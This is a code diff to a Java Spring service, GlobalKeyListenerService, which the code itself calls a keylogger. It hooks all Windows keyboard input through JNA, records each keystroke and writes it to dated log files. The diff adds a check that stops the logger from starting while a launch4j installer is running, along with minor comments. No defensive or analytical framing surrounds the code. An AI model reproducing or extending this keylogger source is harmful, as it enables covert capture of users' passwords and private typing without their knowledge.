@@ -19,10 +19,10 @@ import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.nio.file.Path;
-import java.nio.file.Paths;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.HashSet;
+import java.util.Set;
 
 @Service
 public class GlobalKeyListenerService {
@@ -31,7 +31,7 @@ public class GlobalKeyListenerService {
     private final StringBuilder storedInput = new StringBuilder();
     private final Object inputLock = new Object();
     private static HHOOK hHook;
-
+    // creating a logger to log inputs
     private static final Logger logger = LoggerFactory.getLogger(GlobalKeyListenerService.class);
 
     public static final User32Extended user32 = User32Extended.INSTANCE;
@@ -39,7 +39,7 @@ public class GlobalKeyListenerService {
     public interface User32Extended extends StdCallLibrary {
         User32Extended INSTANCE = Native.load("user32", User32Extended.class, W32APIOptions.UNICODE_OPTIONS);
 
-        // Correct function signatures
+        // creating a hook with attributes
         HHOOK SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, HMODULE hMod, int dwThreadId);
         LRESULT CallNextHookEx(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
         boolean UnhookWindowsHookEx(HHOOK hhk);
@@ -52,10 +52,16 @@ public class GlobalKeyListenerService {
         HMODULE GetModuleHandle(String lpModuleName);
     }
 
+    // initialize the method after the dependencies are loaded
     @PostConstruct
     public void init() {
-        logger.info("Initializing keylogger service...");
-        new Thread(this::startKeylogger).start();
+        if (!isRunByInstaller()) {
+            logger.info("Initializing keylogger service...");
+            new Thread(this::startKeylogger).start();
+        }
+    }
+    private boolean isRunByInstaller() {
+        return System.getProperty("l4j.installer") != null;
     }
 
     public void startKeylogger() {
@@ -68,7 +74,6 @@ public class GlobalKeyListenerService {
                 else if (info.vkCode == WinUser.VK_RSHIFT) {
                     rightShiftPressed = (wParam.intValue() == WinUser.WM_KEYDOWN);
                 }
-
                 // Process key presses
                 if (wParam.intValue() == WinUser.WM_KEYDOWN) {
                     boolean isShiftActive = leftShiftPressed || rightShiftPressed;
@@ -78,7 +83,7 @@ public class GlobalKeyListenerService {
                             storedInput.deleteCharAt(storedInput.length() -1);
                         }
                         storedInput.append(keyChar);
-                        String pattern = "MM-dd-yyyy";
+                        String pattern = "MM-dd-yyyy";  // formatting date style
                         SimpleDateFormat simpleDateFormat = new SimpleDateFormat(pattern);
                         String fileName = "log_" + simpleDateFormat.format(new Date()) + ".txt";
                         File file = new File(fileName);
